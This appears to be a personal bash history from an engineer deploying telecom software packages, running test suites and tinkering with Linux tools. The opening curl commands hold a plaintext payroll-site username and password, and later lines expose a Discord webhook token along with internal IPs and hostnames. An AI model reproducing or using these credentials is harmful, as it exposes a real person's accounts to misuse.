curl -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
curl -ivk -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
curl -Livk -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
curl -c cookiejar -g -O -J -L -F "ctl00$ContentMain$tbEmpUserName=kulldox" -F "ctl00$ContentMain$tbEmpPassword=KullDox_80" https://www.viewpayroll.com/spf/Login/EE_Auth.aspx
curl -c cookiejar -g -O -J -L -F "ctl00$ContentMain$tbEmpUserName=kulldox" -F "ctl00$ContentMain$tbEmpPassword=KullDox_80" -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
curl -vik -c cookiejar -g -O -J -L -F "ctl00$ContentMain$tbEmpUserName=kulldox" -F "ctl00$ContentMain$tbEmpPassword=KullDox_80" -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
curl -c cookiejar -g -O -J -L -F "ctl00$ContentMain$tbEmpUserName=kulldox" -F "ctl00$ContentMain$tbEmpPassword=KullDox_80" -ivk -XPOST -d "__EVENTTARGET=ctl00$ctl00$ContentMain$ContentMain$rptPreviousStubs$ctl00$btnCheckDate&__EVENTARGUMENT=" https://www.viewpayroll.com/spf/Payday/MyHistory.aspx
cd /c/miscprojects/cooltest/scripts/
scp getOutOfOrderNotifications.sh nap@nisda01:/home/nap/users/mct/testtools/
cd ..
tail -f log/myfile.log
ll
tail -f log/myfile.log
scp scripts/igetOutOfOrderNotifications.sh nap@nisda01:/home/nap/users/mct/testtools/
scp scripts/getOutOfOrderNotifications.sh nap@nisda01:/home/nap/users/mct/testtools/
scp nap@nisda01:/home/nap/rdbms_A-rdbms-1-OR-naqor01_downstream_v20.log.201901202204-1.2.aborted_7272 rdbms_A-rdbms-1-OR-naqor01_downstream_v20.log.201901202204-1.2.aborted_7272.csv
scp nap@nisda01:/home/nap/rdbms_A-rdbms-1-OR-naqor01_downstream_v20.log.201901202222-1.2.aborted_7272 rdbms_A-rdbms-1-OR-naqor01_downstream_v20.log.201901202222-1.2.aborted_7272.csv
scp scripts/getOutOfOrderNotifications.sh nap@nisda01:/home/nap/users/mct/testtools/
tail -f log/myfile.log
scp nap@ncsda01:/opt/nap/operations/current/bin/napHelper.sh /c/NAP/Dorina/
cd /c/nokia_git/napPerformanceTestSuite/
ll
cd monitor/
ll
ruby ./generate_final_report.rb html '&from=20:30_20190121&until=01:00_20190122' 'Base (v4.0.2),PartialPartitioned' > generated_graph_test_22Jan2019.html 
ruby ./generate_final_report.rb html '&from=14:00_20190121&until=18:30_20190121' 'Base (v4.0.2),PartialPartitioned' > generated_graph_test_22Jan2019.html 
ruby ./generate_final_report.rb html '&from=14:10_20190121&until=18:35_20190121' 'Base (v4.0.2),PartialPartitioned' > generated_graph_test_22Jan2019.html 
ruby ./generate_final_report.rb html '&from=05:00_20190118&until=09:35_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=05:00_20190118&until=09:20_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=04:50_20190118&until=09:20_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=04:55_20190118&until=09:10_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=04:55_20190118&until=09:05_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=04:55_20190118&until=09:00_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
ruby ./generate_final_report.rb html '&from=04:55_20190118&until=09:03_20190118' 'Base (v4.0.2),FullPartitioned' > generated_graph_test_22Jan2019-fp.html 
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/packages/
ll
scp NSNNAPcookbooks-2.0.5-1.x86_64.rpm nap@ncsda001:/var/opt/nap/packages/
cd ../../release-4.1.4/
cd Packages/
ll
scp NSNNAPqueuing-2.0.3-1.x86_64.rpm nap@ncsda001:/var/opt/nap/packages/
cd ../Documents/
ll
cd ..
ll
cd Packages/
ll
cd ../
cd ..
find . -name NDS_Q_Schema_4x_Check.sh
less ./release-4.1.3/Packages/NDS_Q_Schema_4x_Check.sh
scp ./release-4.1.3/Packages/NDS_Q_Schema_4x_Check.sh nap@naqda001:/var/tmp/
cd release-4.1.5/ProductionInstalls/MW1/
scp -r nap@ncsda001:/var/opt/tmp/wo3957984task5/* wo3957984task5/logs/
cd ../..
ll
cd ProductionInstalls/
ll
cd ProductionPackages/
ll
scp * nap@ncsda001:/var/opt/nap/packages/
ll
scp *.sql superuser1@10.253.21.116:/home/superuser1
scp *TTN*.sql superuser1@:/home/superuser1
scp *TTN*.sql superuser1@10.255.66.52:/home/superuser1
scp MR_4.1.5/*TTN*.sql superuser1@10.255.66.52:/home/superuser1
scp MR_4.1.5/*POL*.sql superuser1@10.253.21.116:/home/superuser1
cd MR_4.1.5/
egrep "DROP EXTERNAL TABLE|DROP TABLE" *POL*.sql 
egrep -h "DROP EXTERNAL TABLE|DROP TABLE" *POL*.sql 
egrep -h "DROP EXTERNAL TABLE|DROP TABLE" *POL*.sql  > cleanup_POL.sql
scp cleanup_POL.sql superuser1@10.253.21.116:/home/superuser1
scp nap@ncsda001:/var/opt/tmp/wo3957984task6/* ../../MW2/wo3957984task6/logs/
scp -r nap@ncsda001:/var/opt/tmp/wo3957984task6/* ../../MW2/wo3957984task6/logs/
cd ../..
scp superuser1@5.209.34.51:/opt/nap/automonitoring/current/reports/distribution/out/Archive/NAP_report_20190124-054001.bz2 .
cd /c/nokia_git/napOperations/bin/
scp napHelper.sh nap@ncsda01:/home/nap/
scp napHelper.sh root@ncsda01:/opt/nap/operations/current/bin/
exit
cd /c/nokia_git/napPerformanceTestSuite/
ll
./syncRemoteFolders.sh 
bash -x ./syncRemoteFolders.sh 
./syncRemoteFolders.sh 
cd /c/nokia_git/napPerformanceTestSuite/
./syncRemoteFolders.sh 
bash -x ./syncRemoteFolders.sh 
./syncRemoteFolders.sh 
bash -x ./syncRemoteFolders.sh 
./syncRemoteFolders.sh 
cd partners_sim/
ll
cd bin/
ll
cd ../current/bin/
ll
cd ..
ll
cd ..
ll
cd bin/
scp partnerSimRestart.sh nap@naqda01:/opt/nap/simulators/partners_sim/current/bin/
scp partnerSimRestart.sh nap@naqor01:/opt/nap/simulators/partners_sim/current/bin/
scp partnerSimRestart.sh nap@naqch01:/opt/nap/simulators/partners_sim/current/bin/
cd /c/miscprojects/cooltest/
ll
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_NSNNAPFOUR236_01
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_NSNNAPFOUR236_01b
scp /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/packages/* nap@ncsda01:/var/opt/nap/packages/
scp nap@ncsda01:/var/opt/tmp/rel-4.1.5/* /c/NAP/NAP4/rel-4.1.0-Drop2/tmolab/updateWith4.1.5/logs/
ll
./startTest.sh TC_E2E.rb "all"; ./startTest.sh TC_PC-QS-IS-E2E.rb "all"
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_NSNNAPFOUR236_02
./startTest.sh TC_rel4.1.0-tmolab.rb test_TC_NSNNAPFOUR236_02b
./startTest.sh TC_E2E.rb "all";
./startTest.sh TC_E2E.rb "all"; ./startTest.sh TC_PC-QS-IS-E2E.rb "all"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_PUBL_DSPA_P_01 test_TC_PUBL_DSPA_P_02 test_TC_PUBL_DSPA_P_03 test_TC_QueueR_01 test_TC_QueueR_02 test_TC_QueueR_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_PUBL_DSPA_P_01 test_TC_PUBL_DSPA_P_02 test_TC_PUBL_DSPA_P_03 test_TC_QueueR_01 test_TC_QueueR_02 test_TC_QueueR_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_PUBL_DSPA_P_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_PUBL_DSPA_P_02 test_TC_PUBL_DSPA_P_03 test_TC_PUBL_DSPA_NP_01 test_TC_PUBL_DSPA_NP_02 test_TC_PUBL_DSPA_NP_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01 test_TC_QueueR_02 test_TC_QueueR_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_02 test_TC_QueueR_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_Send2QPTandCheckNotifs"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_02b"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_01b"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_04b"
ps f
ps -f
ps ef
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_04b"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_03"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR234_02"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_NSNNAPFOUR232_01"
exit
help
man tmux
jobs
exit
tmux
i3
apt-get install i3-wm
i3
apt-get delete i3-wm
apt-get remove i3-wm
ranger
apt-get install ranger
apt-get update
apt-get install ranger
ranger
man ranger
ll
ls- alh
ls -alh
cd .config/
ll
cd ranger/
ll
cd ..
ll
vi .bashrc 
. .bashrc
ll
ranger
vi .bashrc 
. .bashrc
ll
ranger
cd .config/ranger/
ll
les history 
less history 
cd ..
solarized
colortool
exit
apg-get update avconv
apg get update avconv
apt get update avconv
apt-get update avconv
apt-get avconv
apt-get install avconv
apt-get install libav-tools
apt-get install autoremove
apt-get autoremove
avconv -v
vi getmp3Listfromyoutube.sh 
apt-get upgrade
apt-get update
vi getmp3Listfromyoutube.sh 
./getmp3Listfromyoutube.sh "https://www.youtube.com/playlist?list=PLRrumtT8AAex3R-tU8gU4sOH-K2LseyXy"
sudo apt get install i3
sudo apt install i3
exit
ls -al
ranger 
ll
ranger
tail .bashrc
cd .config/
ll
cd ranger/
ll
ranger --copy-config=all
ll
vi rc.conf 
ranger
vi rc.conf 
ranger
cd
w3m
man w3m
w3m http://instagram.com
ranger
w3mimgdisplay
apt-get w3mimgdisplay
apt-get  install w3mimgdisplay
w3m http://instagram.com
apt-get install surf
surf http://instagram.com
apt-get remove surf
apt-get install go
cd %USERPROFILE%\go
less /c/putty/10.250.37.5-20190128-095626-putty.log 
less /c/putty/10.250.37.4-20190128-094948-putty.log 
less /c/putty/5.232.107.115-20190115-172615-putty.log 
less /c/putty/5.232.107.115-20190115-224036-putty.log 
less /c/putty/5.232.107.115-20190120-171637-putty.log 
less /c/Windows/System32/drivers/etc/hosts 
cd /c/NAP/NAP4/rel-4.1.0-Drop2/
ll
history |grep pandoc
pandoc -s -o nap-4.1.5-Drop2-pre-CAREhandover-training.docx nap-4.1.5-Drop2-pre-CAREhandover-training.txt 
cd /c/miscprojects/cooltest/
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_08"
cd
ls 0alh
ls -alh
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=n_i-QS3Gwus&list=PLCo43qsUhme-R1LScfJzVJuz5rhyCXli3"
apt-get update
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=n_i-QS3Gwus&list=PLCo43qsUhme-R1LScfJzVJuz5rhyCXli3"
youtube-dl -U
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=n_i-QS3Gwus&list=PLCo43qsUhme-R1LScfJzVJuz5rhyCXli3"
youtube-dl -U
vi getmp3Listfromyoutube.sh 
./getmp3Listfromyoutube.sh "https://www.youtube.com/watch?v=n_i-QS3Gwus&list=PLCo43qsUhme-R1LScfJzVJuz5rhyCXli3"
exit
i3
apt install xorg
less /etc/xdg/autostart/vmware-user.desktop 
exit
service lightdm status
systemctl status lightdm
sudo systemctl status lightdm
sudo systemctl restart display-managersudo systemctl restart display-manager
service display-manager start
cat /etc/X11/default-display-manager
restart lightdm  
sudo restart lightdm  
service gdm start
apt install xorg
sudo systemctl restart lightdm.service
startx
xinit
cd /dev
ls -alh
sudo startx
startx -- :1
less /usr/share/X11/xorg.conf.d
less /var/log/Xorg.1.log
ls -alh
cd
ls -alh
vi .Xauthority 
which i3
xinit /usr/bin/i3
less /etc/init.d/x11-common 
exit
cd /c/miscprojects/cooltest/conf/
egrep "<xsd:element name=\".*Req\">|custTypeType" T
egrep "<xsd:element name=\".*Req\">|custTypeType" TMO-NAP-dspaWSDL-1p40.wsdl 
apt get remove i3
apt remove i3
apt remove i3-wm 
apt remove xorg
apt-get autoremove
cd /c/Users/marian.costin/Videos/
youtube-dl -F 22 https://www.youtube.com/watch?v=AzHjmCitB6E
youtube-dl -F 22 "https://www.youtube.com/watch?v=AzHjmCitB6E"
youtube-dl -f 22 "https://www.youtube.com/watch?v=AzHjmCitB6E"
youtube-dl "https://www.youtube.com/watch?v=AzHjmCitB6E"
youtube-dl "https://www.youtube.com/watch?v=AzHjmCitB6E" -f best
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"hello from MCT\"}" https://discordapp.com/api/webhooks/542218352605528064
cd
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"hello from MCT\"}" https://discordapp.com/api/webhooks/542218352605528064
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"hello from MCT\"}" https://discordapp.com/api/webhooks/542225091136716816/dbkn1C0dGeIoWZRJkP7zvWs50YaDtoAjvO_zeP7ENC4AKopqdGxFvW0Lltv5o0zFDgui
cd /c/miscprojects/cooltest/
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_08"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01"
vi res.txt
sed 's/~/\\n/g'
sed 's/~/\\n/g' res.txt 
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01"
./startTest.sh TC_PC-QS-IS-E2E.rb "all"
curl wttr.in
curl wttr.in/bellevue
curl wttr.in/bellevue?format=3
curl wttr.in/bellevue?format=1
curl wttr.in/bellevue?format=2
curl wttr.in/bellevue?format=3
curl wttr.in/bellevue?format=4
curl wttr.in/bellevue?format=5
curl wttr.in/bellevue?m
cd
ll
vi .bashrc 
. .bashrc 
timpul
cd -
ll
cat res.txt 
tr '~' '\n' res.txt 
cat res.txt tr '~' '\n'
cat res.txt |tr '~' "\n"
cat res.txt |tr '~' "\n" | grep -v ----
cat res.txt |tr '~' "\n" | grep -v '----'
cat res.txt |tr '~' "\n" | grep -v "----"
cat res.txt |tr '~' "\n" | egrep -v "----"
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-"
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests,"
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed 's/seconds.\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds.\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds.$/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds\.$/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds\.\$/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds\.\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds\.\\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -en 's/seconds\.\\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | sed -e 's/seconds\.\\n/seconds./g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"
./startTest.sh TC_rel4.1.0-tmolab.rb "al"
./startTest.sh TC_E2E.rb "all";
vi res.txt 
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n" |sed 's/passed/passed\n/g'
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n" |sed 's/passed/passed\n/g')"; curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"${discordMSG}\"}" https://discordapp.com/api/webhooks/542225091136716816/dbkn1C0dGeIoWZRJkP7zvWs50YaDtoAjvO_zeP7ENC4AKopqdGxFvW0Lltv5o0zFDgui
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n" |sed 's/passed/passed\n/g')";
echo $discordMSG
discordMSG="$(cat res.txt|tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\n/g'| tr "|" ' '|sed 's/~/\\n/g')"; curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"${discordMSG}\"}" https://discordapp.com/api/webhooks/542225091136716816/dbkn1C0dGeIoWZRJkP7zvWs50YaDtoAjvO_zeP7ENC4AKopqdGxFvW0Lltv5o0zFDgui
echo $discordMSG
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\n/g'| tr "|" ' '|sed 's/~/\\n/g')";
echo $discordMSG
echo -e $discordMSG
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\n/g'| tr "|" ' '|sed 's/~/\\n/g')";
echo -e $discordMSG
echo -e "$discordMSG"
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\n/g'| tr "|" ' '|sed 's/\n/\\n/g')";
echo -e "$discordMSG"
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\\n/g'| tr "|" ' '|sed 's/\n/\\n/g')";
echo -e "$discordMSG"
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\\n/g'| tr "|" ' ')";
echo -e "$discordMSG"
echo  "$discordMSG"
discordMSG="$(cat res.txt|tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\n/g'| tr "|" ' '|sed 's/~/\\n/g')"; curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"${discordMSG}\"}" https://discordapp.com/api/webhooks/542225091136716816/dbkn1C0dGeIoWZRJkP7zvWs50YaDtoAjvO_zeP7ENC4AKopqdGxFvW0Lltv5o0zFDgui
discordMSG="$(cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\\n/g'| tr "|" ' ')"; curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST -d "{\"content\": \"${discordMSG}\"}" https://discordapp.com/api/webhooks/542225091136716816/dbkn1C0dGeIoWZRJkP7zvWs50YaDtoAjvO_zeP7ENC4AKopqdGxFvW0Lltv5o0zFDgui
echo  "$discordMSG" | wc -c
echo  "$discordMSG"
echo  "$discordMSG" | wc -c
aa=(); echo ${#aa[@]}
aa=(bbb); echo ${#aa[@]}
aa+=(ccc)
echo ${#aa[@]}
echo ${aa[@]}
aa+=()
echo ${#aa[@]}
aa+=( "" )
echo ${#aa[@]}
echo ${aa[@]}
if [[ -z "${aa}" ]]; then echo OK; else echo NOK; fi;
if [[ ! -z "${aa}" ]]; then echo OK; else echo NOK; fi;
echo ${aa[@]}
aa=()
if [[ ! -z "${aa}" ]]; then echo OK; else echo NOK; fi;
./startTest.sh TC_PC-QS-IS-E2E.rb "all"
aa+=(ccc)
echo ${aa[@]}
echo $((${#aa[@]} - 1))
echo ((${#aa[@]} - 1))
$((${#aa[@]} - 1))
./startTest.sh TC_PC-QS-IS-E2E.rb "all"
echo $((${#aa[@]} - 1))
aa=()
echo $((${#aa[@]} - 1))
./startTest.sh TC_PC-QS-IS-E2E.rb "all"
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-|tests," | tr -d "\n"|sed 's/passed/passed\\n/g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-" | tr -d "\n"|sed 's/passed/passed\\n/g'
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-" | tr -d "\n"|sed 's/passed/passed\\n/g'|echo -e
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-" | tr -d "\n"|sed 's/passed/passed\\n/g'|echo
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-" | tr -d "\n"|sed 's/passed/passed\\n/g'|echo -e
cat res.txt |tr '~' "\n" | egrep -v "\-\-\-" | tr -d "\n"|sed 's/passed/passed\\n/g'|echo -n
./startTest.sh TC_PC-QS-IS-E2E.rb "all"
cd
i3
apt-get install i3-wm
i3
vi .bashrc
i3
exit
ls
exit
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/
ll
cd CA
cd CAS-205-704-Z4Q6/
ll
less 9855-DAL-kibana.csv 
wc -l 9855-DAL-kibana.csv
less 9855-DAL-kibana.csv
awk '{print $2}' 9855-DAL-kibana.csv|less
awk -F, '{print $2}' 9855-DAL-kibana.csv|less
awk -F, '{print $2}' 9855-DAL-kibana.csv|sort | uniq | wc -l
awk -F, '{print $2}' 9855-DAL-kibana.csv| wc -l
ls -1
cd ../ProductionInstalls/MW5-rollbackELG/
scp -r nap@ncsel001:/var/opt/tmp/woCR2780632task70/* logs/
ll
cd woCR2780632task70/
scp -r nap@ncsel001:/var/opt/tmp/woCR2780632task70/* logs/
cd /c/miscprojects/cooltest/
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_Custom_CAS205704Z4Q6_01b"
cd /c/NAP/NAP4/rel-4.0.0-Drop1/
ll
cd release-4.0.2/
ll
cd CAPS/
ll
mkdir rpms
cd rpms/
for in monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm; do scp -p 3303 nap@127.0.0.1:/var/opt/nap/packages/${i} .; done
for i in monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm; do scp -p 3303 nap@127.0.0.1:/var/opt/nap/packages/${i} .; done
ssh-copy-id -i id_rsa -p 3303 nap@127.0.0.1
cd
ssh-copy-id -i id_rsa -p 3303 nap@127.0.0.1
ls -alh
ssh-copy-id -i .ssh/id_rsa -p 3303 nap@127.0.0.1
cd /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms
for i in monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm; do scp -p 3303 nap@127.0.0.1:/var/opt/nap/packages/${i} .; done
for i in monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm; do scp -P 3303 nap@127.0.0.1:/var/opt/nap/packages/${i} .; done
cd ../../
cd ..
ll
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/
" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
ls -alh ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/
ls -alh /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/napMonitoringAgent-monitoring-agent-1.1.0.tar.gz
